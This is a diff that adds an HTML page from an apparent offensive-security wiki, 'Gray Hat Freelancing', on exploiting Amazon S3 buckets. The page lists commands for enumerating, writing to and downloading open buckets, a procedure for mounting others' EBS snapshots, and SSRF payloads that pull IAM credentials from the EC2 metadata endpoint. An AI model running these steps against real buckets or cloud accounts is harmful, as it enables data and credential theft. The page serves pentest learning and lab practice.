@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Finding, accessing and exploiting Amazon S3 buckets. Where to look, how to look and ways to leverage features of Amazon S3 buckets to maximize your impac on you target.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Amazon AWS S3 Buckets" />
+<meta property="og:description" content="Finding, accessing and exploiting Amazon S3 buckets. Where to look, how to look and ways to leverage features of Amazon S3 buckets to maximize your impac on you target." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Amazon AWS S3 Buckets | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="active">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Amazon AWS S3 Buckets</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#amazon-bucket-s3-aws">Amazon Bucket S3 AWS</a>
+      <ul>
+        <li><a href="#aws-configuration">AWS Configuration</a></li>
+        <li><a href="#open-bucket">Open Bucket</a></li>
+        <li><a href="#basic-tests">Basic tests</a>
+          <ul>
+            <li><a href="#listing-files">Listing files</a></li>
+            <li><a href="#move-a-file-into-the-bucket">Move a file into the bucket</a></li>
+            <li><a href="#download-every-things">Download every things</a></li>
+            <li><a href="#check-bucket-disk-size">Check bucket disk size</a></li>
+          </ul>
+        </li>
+        <li><a href="#aws---extract-backup">AWS - Extract Backup</a></li>
+        <li><a href="#bucket-juicy-data">Bucket juicy data</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="amazon-bucket-s3-aws">
+  Amazon Bucket S3 AWS
+  <a class="anchor" href="#amazon-bucket-s3-aws">#</a>
+</h1>
+<h2 id="aws-configuration">
+  AWS Configuration
+  <a class="anchor" href="#aws-configuration">#</a>
+</h2>
+<p>Prerequisites, at least you need awscli</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install awscli
+</span></span></code></pre></div><p>You can get your credential here 
+  <a href="https://console.aws.amazon.com/iam/home?#/security_credential">https://console.aws.amazon.com/iam/home?#/security_credential</a>
+but you need an aws account, free tier account : 
+  <a href="https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/">https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">aws</span> <span style="color:#a6e22e">configure</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AWSAccessKeyId</span><span style="color:#f92672">=</span>[<span style="color:#a6e22e">ENTER</span> <span style="color:#a6e22e">HERE</span> <span style="color:#a6e22e">YOUR</span> <span style="color:#a6e22e">KEY</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AWSSecretKey</span><span style="color:#f92672">=</span>[<span style="color:#a6e22e">ENTER</span> <span style="color:#a6e22e">HERE</span> <span style="color:#a6e22e">YOUR</span> <span style="color:#a6e22e">KEY</span>]
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">aws</span> <span style="color:#a6e22e">configure</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">profile</span> <span style="color:#a6e22e">nameofprofile</span>
+</span></span></code></pre></div><p>then you can use <em>&ndash;profile nameofprofile</em> in the aws command.</p>
+<p>Alternatively you can use environment variables instead of creating a profile.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span>ASIAZ<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>PODP56
+</span></span><span style="display:flex;"><span>export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span>fPk/Gya<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>4/j5bSuhDQ
+</span></span><span style="display:flex;"><span>export AWS_SESSION_TOKEN<span style="color:#f92672">=</span>FQoGZXIvYXdzE<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>8aOK4QU<span style="color:#f92672">=</span>
+</span></span></code></pre></div><h2 id="open-bucket">
+  Open Bucket
+  <a class="anchor" href="#open-bucket">#</a>
+</h2>
+<p>By default the name of Amazon Bucket are like 
+  <a href="http://s3.amazonaws.com/[bucket_name]/">http://s3.amazonaws.com/[bucket_name]/</a>, you can browse open buckets if you know their names</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://s3.amazonaws.com/<span style="color:#f92672">[</span>bucket_name<span style="color:#f92672">]</span>/
+</span></span><span style="display:flex;"><span>http://<span style="color:#f92672">[</span>bucket_name<span style="color:#f92672">]</span>.s3.amazonaws.com/
+</span></span><span style="display:flex;"><span>http://flaws.cloud.s3.amazonaws.com/
+</span></span><span style="display:flex;"><span>https://buckets.grayhatwarfare.com/
+</span></span></code></pre></div><p>Their names are also listed if the listing is enabled.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;ListBucketResult</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://s3.amazonaws.com/doc/2006-03-01/&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Name&gt;</span>adobe-REDACTED-REDACTED-REDACTED<span style="color:#f92672">&lt;/Name&gt;</span>
+</span></span></code></pre></div><p>Alternatively you can extract the name of inside-site s3 bucket with <code>%C0</code>. (Trick from 
+  <a href="https://twitter.com/0xmdv/status/1065581916437585920">https://twitter.com/0xmdv/status/1065581916437585920</a>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>http://example.com/resources/id%C0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eg: http://redacted/avatar/123%C0
+</span></span></code></pre></div><h2 id="basic-tests">
+  Basic tests
+  <a class="anchor" href="#basic-tests">#</a>
+</h2>
+<h3 id="listing-files">
+  Listing files
+  <a class="anchor" href="#listing-files">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
+</span></span><span style="display:flex;"><span>aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
+</span></span></code></pre></div><p>You can get the region with a dig and nslookup</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ dig flaws.cloud
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
+</span></span><span style="display:flex;"><span>flaws.cloud.    <span style="color:#ae81ff">5</span>    IN    A    52.218.192.11
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ nslookup 52.218.192.11
+</span></span><span style="display:flex;"><span>Non-authoritative answer:
+</span></span><span style="display:flex;"><span>11.192.218.52.in-addr.arpa name <span style="color:#f92672">=</span> s3-website-us-west-2.amazonaws.com.
+</span></span></code></pre></div><h3 id="move-a-file-into-the-bucket">
+  Move a file into the bucket
+  <a class="anchor" href="#move-a-file-into-the-bucket">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read
+</span></span><span style="display:flex;"><span>aws s3 cp login.html s3://$bucketName --grants read<span style="color:#f92672">=</span>uri<span style="color:#f92672">=</span>http://acs.amazonaws.com/groups/global/AllUsers
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 mv test.txt s3://hackerone.marketing
+</span></span><span style="display:flex;"><span>FAIL : <span style="color:#e6db74">&#34;move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aws s3 mv test.txt s3://hackerone.files
+</span></span><span style="display:flex;"><span>SUCCESS : <span style="color:#e6db74">&#34;move: ./test.txt to s3://hackerone.files/test.txt&#34;</span>
+</span></span></code></pre></div><h3 id="download-every-things">
+  Download every things
+  <a class="anchor" href="#download-every-things">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+</span></span></code></pre></div><h3 id="check-bucket-disk-size">
+  Check bucket disk size
+  <a class="anchor" href="#check-bucket-disk-size">#</a>
+</h3>
+<p>Use <code>--no-sign</code> for un-authenticated check.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 ls s3://&lt;bucketname&gt; --recursive  | grep -v -E <span style="color:#e6db74">&#34;(Bucket: |Prefix: |LastWriteTime|^</span>$<span style="color:#e6db74">|--)&#34;</span> | awk <span style="color:#e6db74">&#39;BEGIN {total=0}{total+=$3}END{print total/1024/1024&#34; MB&#34;}&#39;</span>
+</span></span></code></pre></div><h2 id="aws---extract-backup">
+  AWS - Extract Backup
+  <a class="anchor" href="#aws---extract-backup">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ aws --profile flaws sts get-caller-identity
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Account&#34;</span>: <span style="color:#e6db74">&#34;XXXX26262029&#34;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ aws --profile profile_name ec2 describe-snapshots
+</span></span><span style="display:flex;"><span>$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;SnapshotId&#34;</span>: <span style="color:#e6db74">&#34;snap-XXXX342abd1bdcb89&#34;</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Create a volume using snapshot
+</span></span><span style="display:flex;"><span>$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
+</span></span><span style="display:flex;"><span>In Aws Console -&gt; EC2 -&gt; New Ubuntu
+</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">400</span> YOUR_KEY.pem
+</span></span><span style="display:flex;"><span>$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mount the volume
+</span></span><span style="display:flex;"><span>$ lsblk
+</span></span><span style="display:flex;"><span>$ sudo file -s /dev/xvda1
+</span></span><span style="display:flex;"><span>$ sudo mount /dev/xvda1 /mnt
+</span></span></code></pre></div><h2 id="bucket-juicy-data">
+  Bucket juicy data
+  <a class="anchor" href="#bucket-juicy-data">#</a>
+</h2>
+<p>Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/user-data/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will <span style="color:#66d9ef">return</span> the AccessKeyID, SecretAccessKey, and Token
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.<span style="color:#ae81ff">254</span>/latest/meta-data/iam/security-credentials/PhotonInstance
+</span></span></code></pre></div><p>For example with a proxy : 
+  <a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</a></p>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets">There&rsquo;s a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis</a></li>
+<li>
+  <a href="https://twitter.com/bugbsurveys/status/859389553211297792">Bug Bounty Survey - AWS Basic test</a></li>
+<li>
+  <a href="http://flaws.cloud/">flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route</a></li>
+<li>
+  <a href="http://flaws2.cloud">flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route</a></li>
+<li>
+  <a href="https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/">Guardzilla video camera hardcoded AWS credential - 0dayallday.org</a></li>
+<li>
+  <a href="https://www.virtuesecurity.com/aws-penetration-testing-part-1-s3-buckets/">AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity</a></li>
+<li>
+  <a href="https://www.virtuesecurity.com/aws-penetration-testing-part-2-s3-iam-ec2/">AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity</a></li>
+<li>
+  <a href="https://blog.cloudsploit.com/a-technical-analysis-of-the-capital-one-hack-a9b43d7c8aea?gi=8bb65b77c2cf">A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/amazon_aws_s3_buckets.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#amazon-bucket-s3-aws">Amazon Bucket S3 AWS</a>
+      <ul>
+        <li><a href="#aws-configuration">AWS Configuration</a></li>
+        <li><a href="#open-bucket">Open Bucket</a></li>
+        <li><a href="#basic-tests">Basic tests</a>
+          <ul>
+            <li><a href="#listing-files">Listing files</a></li>
+            <li><a href="#move-a-file-into-the-bucket">Move a file into the bucket</a></li>
+            <li><a href="#download-every-things">Download every things</a></li>
+            <li><a href="#check-bucket-disk-size">Check bucket disk size</a></li>
+          </ul>
+        </li>
+        <li><a href="#aws---extract-backup">AWS - Extract Backup</a></li>
+        <li><a href="#bucket-juicy-data">Bucket juicy data</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
